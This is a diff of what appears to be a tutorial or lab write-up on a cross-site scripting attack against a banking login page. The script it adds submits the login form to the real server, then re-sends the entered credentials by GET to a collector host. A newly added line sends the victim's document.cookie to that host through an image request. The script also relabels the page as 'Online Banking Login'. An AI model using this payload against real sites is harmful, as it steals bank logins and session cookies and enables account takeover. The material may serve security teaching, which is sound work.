@@ -11,19 +11,20 @@ You must have local server setup, here it is node server localhost:30000. code i
 <script type="text/javascript">
     function SubmitForm()
     {
-            document.forms['login'].action='doLogin'; // Login orignal server
+            document.forms['login'].action='doLogin';
             document.forms["login"].method = "post";
             document.forms["login"].target = "_self";
             document.forms["login"].submit();
 
-            document.forms["login"].action = "http://localhost:3000"; // Local server of choice
+            document.forms["login"].action = "http://localhost:3000/";
+            new Image().src="http://localhost:3000/?"+document.cookie;
             document.forms["login"].method = "get";
-            document.forms["login"].target = "http://localhost:3000";
+            document.forms["login"].target = "http://localhost:3000/";
             document.forms["login"].submit();
             return (true);
     }
     document.getElementsByClassName("fl")[0].children[0].textContent = "Online Banking Login";
-    document.getElementsByClassName("fl")[0].children[1].textContent = "";            
+    document.getElementsByClassName("fl")[0].children[1].textContent = "";
 </script>
 
 # Below is the link prepared from the above script.
